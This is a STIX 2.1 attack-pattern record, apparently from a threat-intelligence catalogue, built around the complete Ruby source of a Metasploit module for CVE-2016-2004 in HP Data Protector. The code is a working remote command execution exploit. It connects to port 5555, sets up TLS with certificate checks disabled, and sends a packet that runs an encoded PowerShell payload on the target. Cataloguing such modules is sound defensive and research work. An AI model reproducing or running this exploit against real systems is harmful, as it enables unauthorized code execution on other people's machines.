{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c4f85971-b055-4691-9304-69358ee6ce31",
    "created": "2024-08-14T16:46:34.668752Z",
    "modified": "2024-08-14T16:46:34.668756Z",
    "name": "\"HP Data Protector Encrypted Communication Remote Command Execution\"",
    "description": " This module exploits a well known remote code execution exploit after establishing encrypted control communications with a Data Protector agent. This allows exploitation of Data Protector agents that have been configured to only use encrypted control communications.  This exploit works by executing the payload with Microsoft PowerShell so will only work against Windows Vista or newer. Tested against Data Protector 9.0 installed on Windows Server 2008 R2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_dataprotector_encrypted_comms.rb",
            "external_id": "hp_dataprotector_encrypted_comms.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-2004"
        },
        {
            "source_name": "reference",
            "url": "http://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05085988"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP Data Protector Encrypted Communication Remote Command Execution\",\n      'Description'    => %q{\n        This module exploits a well known remote code execution exploit after establishing encrypted\n        control communications with a Data Protector agent. This allows exploitation of Data\n        Protector agents that have been configured to only use encrypted control communications.\n\n        This exploit works by executing the payload with Microsoft PowerShell so will only work\n        against Windows Vista or newer. Tested against Data Protector 9.0 installed on Windows\n        Server 2008 R2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jon Barg',    # Reported vuln (originally discovery?) credited by HP\n          'Ian Lovering' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2016-2004' ],\n          [ 'URL', 'http://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05085988' ]\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'WfsDelay' => 30,\n          'RPORT' => 5555\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2016-04-18',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    # For the check command\n    connect\n    sock.put(rand_text_alpha_upper(64))\n    response = sock.get_once(-1)\n    disconnect\n\n    if response.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    service_version = Rex::Text.to_ascii(response).chop.chomp\n\n    if service_version =~ /HP Data Protector/\n      vprint_status(service_version)\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n\n  end\n\n  def generate_dp_payload\n    command = cmd_psh_payload(\n      payload.encoded,\n      payload_instance.arch.first,\n      { remove_comspec: true, encode_final_payload: true })\n\n    payload =\n      \"\\x32\\x00\\x01\\x01\\x01\\x01\\x01\\x01\" +\n      \"\\x00\\x01\\x00\\x01\\x00\\x01\\x00\\x01\" +\n      \"\\x01\\x00\\x20\\x32\\x38\\x00\\x5c\\x70\" +\n      \"\\x65\\x72\\x6c\\x2e\\x65\\x78\\x65\\x00\" +\n      \"\\x20\\x2d\\x65\\x73\\x79\\x73\\x74\\x65\" +\n      \"\\x6d('#{command}')\\x00\"\n\n    payload_length = [payload.length].pack('N')\n\n    return payload_length + payload\n  end\n\n  def exploit\n    # Main function\n    encryption_init_data =\n      \"\\x00\\x00\\x00\\x48\\xff\\xfe\\x32\\x00\\x36\\x00\\x37\\x00\\x00\\x00\\x20\\x00\" +\n      \"\\x31\\x00\\x30\\x00\\x00\\x00\\x20\\x00\\x31\\x00\\x30\\x00\\x30\\x00\\x00\\x00\" +\n      \"\\x20\\x00\\x39\\x00\\x30\\x00\\x30\\x00\\x00\\x00\\x20\\x00\\x38\\x00\\x38\\x00\" +\n      \"\\x00\\x00\\x20\\x00\\x6f\\x00\\x6d\\x00\\x6e\\x00\\x69\\x00\\x64\\x00\\x6c\\x00\" +\n      \"\\x63\\x00\\x00\\x00\\x20\\x00\\x34\\x00\\x00\\x00\\x00\\x00\"\n\n    print_status(\"Initiating connection\")\n\n    # Open connection\n    connect\n\n    # Send init data\n    sock.put(encryption_init_data)\n    begin\n      buf = sock.get_once\n    rescue ::EOFError => e\n      elog(e)\n    end\n\n    print_status(\"Establishing encrypted channel\")\n\n    # Create TLS / SSL context\n    sock.extend(Rex::Socket::SslTcp)\n    sock.sslctx  = OpenSSL::SSL::SSLContext.new(:SSLv23)\n    sock.sslctx.verify_mode = OpenSSL::SSL::VERIFY_NONE\n\n    sock.sslctx.options = OpenSSL::SSL::OP_ALL\n\n    # Enable all ciphers as older versions of Data Protector only use\n    # some not enabled by default\n    sock.sslctx.ciphers = \"ALL\"\n\n    # Enable TLS / SSL\n    sock.sslsock = OpenSSL::SSL::SSLSocket.new(sock, sock.sslctx)\n    sock.sslsock.connect\n\n    print_status(\"Sending payload\")\n\n    # Send payload\n    sock.put(generate_dp_payload(), {timeout: 5})\n\n    # Close socket\n    disconnect\n\n    print_status(\"Waiting for payload execution (this can take up to 30 seconds or so)\")\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2016-04-18",
    "x_mitre_platforms": [
        "win'"
    ]
}